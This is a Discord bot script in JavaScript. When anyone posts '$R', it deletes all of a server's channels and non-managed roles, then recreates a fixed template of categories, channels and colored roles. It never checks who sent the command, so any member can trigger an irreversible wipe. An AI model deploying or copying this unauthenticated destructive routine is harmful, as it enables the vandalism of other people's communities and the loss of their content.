const { Client, GatewayIntentBits, ChannelType } = require('discord.js');
const fs = require('fs');

const config = JSON.parse(fs.readFileSync('./config.json', 'utf8'));

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
    ]
});

client.once('ready', () => {
    console.log('Bot is ready!');
});

client.on('messageCreate', async message => {
    if (message.content === '$R') {
        if (!message.channel) {
            console.error('No channel found to send messages.');
            return;
        }

        console.log(`Received $R command from ${message.author.tag}`);
        
        const channels = message.guild.channels.cache;
        for (const channel of channels.values()) {
            try {
                await channel.delete();
                console.log(`Deleted ${channel.name} channel.`);
            } catch (error) {
                console.error(`Error deleting channel ${channel.name}:`, error);
            }
        }


        await new Promise(resolve => setTimeout(resolve, 5000));


        const roles = message.guild.roles.cache.filter(role => role.name !== '@everyone');
        for (const role of roles.values()) {
            try {
                if (role.managed) {
                    console.log(`Skipping bot role ${role.name}.`);
                    continue; 
                }

                await role.delete();
                console.log(`Deleted ${role.name} role.`);
            } catch (error) {
                if (error.code === 50013) { 
                    console.error(`Cannot delete role ${role.name}. Missing permissions.`);
                } else if (error.code === 50028) { 
                    console.error(`Cannot delete role ${role.name}. Invalid role.`);
                } else {
                    console.error(`Error deleting role ${role.name}:`, error);
                }
            }
        }

        await new Promise(resolve => setTimeout(resolve, 5000)); 
        try {
            const category = await message.guild.channels.create({
                name: '🚨info🚨',
                type: ChannelType.GuildCategory
            });

            await message.guild.channels.create({
                name: '╭🦖welcome',
                type: ChannelType.GuildText,
                parent: category.id
            });

            await message.guild.channels.create({
                name: '┃ Rules',
                type: ChannelType.GuildText,
                parent: category.id
            });

            await message.guild.channels.create({
                name: '╰ Startboard',
                type: ChannelType.GuildText,
                parent: category.id
            });

                        const mainCategory = await message.guild.channels.create({
                            name: 'Main Channels',
                            type: ChannelType.GuildCategory
                        });
            
                        await message.guild.channels.create({
                            name: 'General',
                            type: ChannelType.GuildText,
                            parent: mainCategory.id
                        });
            
                        await message.guild.channels.create({
                            name: 'Memes',
                            type: ChannelType.GuildText,
                            parent: mainCategory.id
                        });
            
                        await message.guild.channels.create({
                            name: 'Art',
                            type: ChannelType.GuildText,
                            parent: mainCategory.id
                        });

            const newRoles = [
                { name: 'Owner', color: '#FF0000' }, // Red
                { name: 'Server Member', color: '#0000FF' }, // Blue
                { name: 'Muted', color: '#808080' }, // Grey
                { name: 'YouTube Ping', color: '#FFFF00' }, // Yellow
                { name: 'QOTD Ping', color: '#00FF00' }, // Green
                { name: 'Programmer', color: '#FFA500' } // Orange
            ];

            for (const role of newRoles) {
                try {
                    await message.guild.roles.create({
                        name: role.name,
                        color: role.color,
                        reason: `Role ${role.name} created by bot`
                    });
                    console.log(`Created ${role.name} role.`);
                } catch (error) {
                    console.error(`Error creating role ${role.name}:`, error);
                }
            }

            if (message.channel) {
                message.channel.send('Channels, categories, and roles recreated.');
            }
        } catch (error) {
            console.error('Error creating channels or category:', error);
        }
    }
});

client.login(config.token);
